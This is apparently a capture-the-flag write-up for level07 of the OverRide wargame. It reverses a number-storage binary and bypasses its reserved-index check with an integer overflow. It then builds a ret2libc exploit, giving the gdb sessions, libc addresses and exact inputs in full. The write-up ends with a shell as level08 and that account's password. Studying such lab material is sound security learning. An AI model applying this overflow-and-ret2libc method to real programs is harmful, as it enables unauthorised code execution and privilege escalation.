# Level 07

## GDB Utils

There is a main() function, and the following, read_number(), store_number(), get_unum() functions.

The assembly dump is enormous, so for this README, i will only show the reversed version of the dump with IDA.


IDA :

```c
int get_unum()
{
  int v1[3];

  v1[0] = 0;
  fflush(stdout);
  __isoc99_scanf(&unk_8048AD0, v1);
  clear_stdin();
  return v1[0];
}

int store_number(int a1)
{
  unsigned int unum;
  unsigned int v3;

  printf(" Number: ");
  unum = get_unum();
  printf(" Index: ");
  v3 = get_unum();
  if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 )
  {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  }
  else
  {
    *(_DWORD *)(a1 + 4 * v3) = unum;
    return 0;
  }
}

int read_number(int a1)
{
  int unum;

  printf(" Index: ");
  unum = get_unum();
  printf(" Number at data[%u] is %u\n", unum, *(_DWORD *)(a1 + 4 * unum));
  return 0;
}

int main(int argc, const char **argv, const char **envp)
{
  _BYTE v6[400];
  int number;
  char s[4];
  int v9;
  int v10;
  int v11;
  int v12;
  unsigned int v13;

  v13 = __readgsdword(0x14u);
  number = 0;
  *(_DWORD *)s = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  memset(v6, 0, sizeof(v6));
  while ( *argv )
  {
    memset((void *)*argv, 0, strlen(*argv));
    ++argv;
  }
  while ( *envp )
  {
    memset((void *)*envp, 0, strlen(*envp));
    ++envp;
  }
  puts(
    "----------------------------------------------------\n"
    "  Welcome to wil's crappy number storage service!   \n"
    "----------------------------------------------------\n"
    " Commands:                                          \n"
    "    store - store a number into the data storage    \n"
    "    read  - read a number from the data storage     \n"
    "    quit  - exit the program                        \n"
    "----------------------------------------------------\n"
    "   wil has reserved some storage :>                 \n"
    "----------------------------------------------------\n");
  while ( 1 )
  {
    printf("Input command: ");
    number = 1;
    fgets(s, 20, stdin);
    s[strlen(s) - 1] = 0;
    if ( !memcmp(s, "store", 5u) )
    {
      number = store_number((int)v6);
      goto LABEL_13;
    }
    if ( !memcmp(s, "read", 4u) )
    {
      number = read_number((int)v6);
      goto LABEL_13;
    }
    if ( !memcmp(s, "quit", 4u) )
      return 0;
LABEL_13:
    if ( number )
      printf(" Failed to do %s command\n", s);
    else
      printf(" Completed %s command successfully\n", s);
    *(_DWORD *)s = 0;
    v9 = 0;
    v10 = 0;
    v11 = 0;
    v12 = 0;
  }
}
```

The IDA output is kinda weird, there is obviously no GOTO in the program, but we dont care if its precise or not.

We see the variable v6[400] array in the main function(), and is where we guess the value are stored.

We also see this :

```c
 while ( *argv )
  {
    memset((void *)*argv, 0, strlen(*argv));
    ++argv;
  }
  while ( *envp )
  {
    memset((void *)*envp, 0, strlen(*envp));
    ++envp;
  }
```

This means, no shellcode.


Lets test the binary behavior.

```sh
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit
level07@OverRide:~$
```

So the program wait for input and use strcmp to behave like a shell.

```sh
level07@OverRide:~$
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 10
 Completed store command successfully
Input command: read
 Index: 10
 Number at data[10] is 42
 Completed read command successfully
Input command:
```

As you can see the behavior is pretty straightfoward, the binary store your data and let your reads it if you have the index.

But there is some special case, when we try to store a number in the index 0 for example.

```sh
level07@OverRide:~$ ./level07
Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

The program doesn't let us store data in that index.

Lets see why, in the store_number() function.

I will comment some details.

Here the a1 parameter is the array where the value are stored.

```c
int store_number(int a1)
{
  unsigned int unum;
  unsigned int v3;

  printf(" Number: ");
  unum = get_unum(); // It look like a singleton, but that's how it takes our input
  printf(" Index: ");
  v3 = get_unum(); // Also look like a singleton, but that's how it takes our input
  if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 ) // IDA Output is weird, but when we translate it, it actually does v3 % 3, so if v3 is a multiple of 3, then we return error.
  {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  }
  else
  {
    *(_DWORD *)(a1 + 4 * v3) = unum; // else we just store the data at the index
    return 0;
  }
}
```

Here the a1 parameter is the array where the value are stored.

The a1 parameter is the previously initated v6[400] array in the main function(), and is where we guess the value are stored.

So if we give something around the value higher then 400 it should segfault

So you cannot store data in a1 if the index is a multiple of 3, lets check that to be sure.


```sh
level07@OverRide:~$ ./level07

Input command: store
 Number: 42
 Index: 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

Ok, but then why would do that ?

We know we cannot insert any shellcode, but we can make a ret2libc exploit since :


```
level07@OverRide:~$ objdump -R ./level07

./level07:     file format elf32-i386
(...)
0804a01c R_386_JUMP_SLOT   __libc_start_main
(...)
level07@OverRide:~$
```

And in a ret2libc exploit, we need, right next to each other :

```
system()ADDR + (Random 4 byte OR exit()ADDR) + "/bin/sh"ADDR
```

3 address right next to each other, but the programs doesn't allow us to do that.

How could we then, well, with integer overflows.

Translated version of the if statement :

```c
unsigned int value;
unsigned int index;
value = get_unum();
index = get_unum();
(...)

if ( index % 3 == 0 || HIBYTE(value) == 183 ) // Translated the first if statement
{
  puts(" *** ERROR! ***");
  puts("   This index is reserved for wil!");
  puts(" *** ERROR! ***");
  return 1;
}
else
  {
    *(_DWORD *)(data + 4 * index) = value; // else we just store the data at the index
    return 0;
  }
```

Since the index is submited to a % 3, if we overflow the value, it can skip the if, but still be a value that can enter our index row.

The idea is to look for a value that is a multiple of 3, but that skip the if.

In order to know what we are doing, im going to isolate this part of the code and make our test.

My script :

```c
#include <stdio.h>
#include <string.h>

int main(int ac, char **av)
{
        if ( ac != 2)
                return 1;

        unsigned int index;
        index = atoi(av[1]);

        if ( index % 3 == 0)
        {
                printf("index moduled : %d\n", index % 3);
                printf("unsigned index : %u\n", index);
                puts(" *** ERROR! ***");
                puts("   This index is reserved for wil!");
                puts(" *** ERROR! ***");
                return 1;
        }
        printf("unsigned index : %u\n", index);
        printf("index moduled : %d\n", index % 3);
}
```
Lets test a value that will transform to 0 and skip our first if.

With U_INT MAX + 1;

```sh
./a.out 4294967296
index moduled : 0
index : 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***

./a.out 4294967297
unsigned index : 1
int index : 1
index moduled : 1

./a.out 4294967298
unsigned index : 2
int index : 2
index moduled : 2

./a.out 4294967299
index moduled : 0
index : 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
```

As you can see, it doesn't work, even going beyond the U_INT MAX, the value is still a multiple of 3.

After brainstorming for hours, we notice something very tricky and hard to find.

Lets say im storing the value 4242 at the index 2, it will work propely, it will skip the first if and enter this else :

```c
(...)
else
{
  *(_DWORD *)(data + 4 * index) = value;
  return 0;
}
```

The data variable is the array where the value are stored, and this array is an array of int.

We know that by 2 ways, at the call of the function store_number (Depending of the reverse tool you used of course.) :

```c
if ( !memcmp(s, "store", 5u) )
{
  number = store_number((int)v6); // The tab as int
  goto LABEL_13; // Buggy reverse tool
}
```

Or direcly when we assign the value in the array :


```c
*(_DWORD *)(data + 4 * index) = value;
```

The array (data) + 4 (size of an int) * index;

If it would be an array of char it would be like this :

The array (data) + 1 (size of a char) * index;

For now nothing hard to find yes, but this mean we can get our 0 index value with that * 4 multiplication !

And this is where the tricky part begin.

Before we tried this value to get a 0 index.

```c
./a.out 4294967296
index moduled : 0
index : 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
```

U_INT MAX + 1 is the value to get a 0, but this value get multiplicated by 4 which give us :


```sh
./a.out 17179869184
index moduled : 0
index : 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
```

Still the same result, but lets try to divide it by 4 this time.

```sh
./a.out 1073741824
unsigned index : 1073741824
int index : 1073741824
index moduled : 1
```

Its not a multiple of 3 ! So it will skip the first if, will enter this line :

```c
*(_DWORD *)(data + 4 * 1073741824) = value;
```

And you guessed it, its gonna be a 0 since 1073741824 * 4 = 4294967296.

Lets test in the true binary :

```sh
Input command: store
 Number: 4242
 Index: 1073741824
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 4242
 Completed read command successfully
Input command:
```

Ok but lets say i want to store the value 4242 at the index data[3].

Would it be (U_INT MAX + 1) + 4 divided by 4 ?

Well it will give the same result :

```sh
./a.out 4294967299
index moduled : 0
index : 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
➜  workspace
```

It give 3, but when we divide it by 4

```
4294967299 / 4 = 1073741824
```

Which is the same value we used to get into data[0], since 

```
1073741824 * 4 = 4294967296
```

As said before we divive U_INT by 4, so if we want that value to be equal to 3 after getting multiplied by 4, we need to add 3 * 4 to (U_INT MAX + 1).

The reason is, as said before, an int is 4 byte long, so we must jump 4 by 4.

The final formula is so :

```
(U_INT MAX + 1) + (ValueWeWant * 4) / 4 = index

Example if we want the index for data[10].

4294967296 + (10 * 4) / 4 = 1073741834

Lets test it:

```
Input command: store
 Number: 4242
 Index: 1073741834
 Completed store command successfully
Input command: read 10
 Index: 10
 Number at data[10] is 4242
 Completed read 10 command successfully
Input command:
```

```

Time to build a ret2libc exploit !

```
(gdb) br main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
process 1726
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find  0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb)
```

Our address :

```
system() = 0xf7e6aed0;
exit() = 0xf7e5eb70;
"/bin/sh" = 0xf7f897ec;

In decimal :

system() = 4159090384;
exit() = 4159040368;
"/bin/sh" = 4160264172;

```

Lets try inserting those addresses in the array, i dont expect it work now, since i dont have the control of the EIP.

```sh
Input command: store
 Number: 4159090384
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 1
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 4159090384
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 4159040368
 Completed read command successfully
Input command: read
 Index: 2
 Number at data[2] is 4160264172
 Completed read command successfully
Input command:
```

The addresses are in the array, but are not overwriting the EIP, and that's what we are going to do.

We need to find a way to insert the value at the EIP.

When we call the read_number() function :


```c
int read_number(int a1)
{
  int unum;

  printf(" Index: ");
  unum = get_unum();
  printf(" Number at data[%u] is %u\n", unum, *(_DWORD *)(a1 + 4 * unum));
  return 0;
}
```

The hole array is brought by the call, and that array is stored in %eax before calling read_number().

From here we can try to overwrite the EIP, we are going to need to distance between this eax and the current EIP when read_number() is called, like so :

```
0x08048922 <+511>:   jne    0x8048939 <main+534>
0x08048924 <+513>:   lea    0x24(%esp),%eax
0x08048928 <+517>:   mov    %eax,(%esp)  <<<<<<<<<<<<<<<< Our array is here
0x0804892b <+520>:   call   0x80486d7 <read_number> <<<<<<<<<<<<<<<< read_number() is called
0x08048930 <+525>:   mov    %eax,0x1b4(%esp)
0x08048937 <+532>:   jmp    0x8048965 <main+578>
(gdb) br *main+517
Breakpoint 1 at 0x8048928
(gdb) run
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x08048928 in main ()
(gdb) info f
Stack level 0, frame at 0xffffd720:
 eip = 0x8048928 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args:
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
(gdb) info r
eax            0xffffd554       -10924
ecx            0xffffd600       -10752
edx            0xffffd600       -10752
ebx            0xffffd554       -10924
esp            0xffffd530       0xffffd530
ebp            0xffffd718       0xffffd718
esi            0xffffd6ec       -10516
edi            0x8048d65        134516069
eip            0x8048928        0x8048928 <main+517>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) p 0xffffd71c - 0xffffd554
$1 = 456
(gdb)
```

We need to write 456 byte to reach the EIP, but remember the array is an int, and one index equal 4 byte.

This means that data[114], is located at the 456 byte of the array, and data[115] at 460 and so on....

So we must not write our 3 addresses at the 456 - 457 - 458 bytes.

Which give us 

```
data[114] = 4159090384; system()
data[115] = 4159040368; exit()
data[116] = 4160264172; "/bin/sh"
```

And when we will call read, it will call read_number() with the array overflowing the EIP, with the ret2libc exploit, lets execute that using everything we learned through this guide !

The index we can't store is the 114 one, so lets make an integer overwrite on it.

```
(4294967296) + (114 * 4) / 4 = 1073741938
```

OK, we should have everything now ! Lets finally test if that works...


```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: read 114
 Index: 114
 Number at data[114] is 4159090384
 Completed read 114 command successfully
Input command: read
 Index: 115
 Number at data[115] is 4159040368
 Completed read  command successfully
Input command: read
 Index: 116
 Number at data[116] is 4160264172
 Completed read command successfully
Input command:
```

Every address is in the array, and is currently suppose to overwrite the EIP, now we must go that EIP, lets quit the program using the 'quit' command, and see if it prompt a shell.

```
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```

And it FINALLY worked.